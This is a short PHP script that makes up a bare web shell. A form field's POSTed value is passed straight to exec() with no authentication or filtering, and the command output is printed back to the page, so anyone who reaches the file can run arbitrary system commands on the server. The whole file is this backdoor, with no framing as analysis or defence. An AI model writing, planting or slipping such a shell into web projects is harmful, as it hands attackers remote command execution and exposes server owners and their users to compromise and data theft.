<?php
set_time_limit(0);

$a = array();
$b = array();

if(isset($_POST['cmd']) && $_POST['cmd'] != ''){
	$cmd = $_POST['cmd'];
	exec($cmd, $a, $b);

	echo "<pre>";
	print_r($a);
	print_r($b);
	echo "</pre>";
}
?>

<form name="frm" method="post" action="">
<input type="text" name="cmd" style="width:400px" />
<br />
<input type="submit" value="ok" name="b1" />
</form>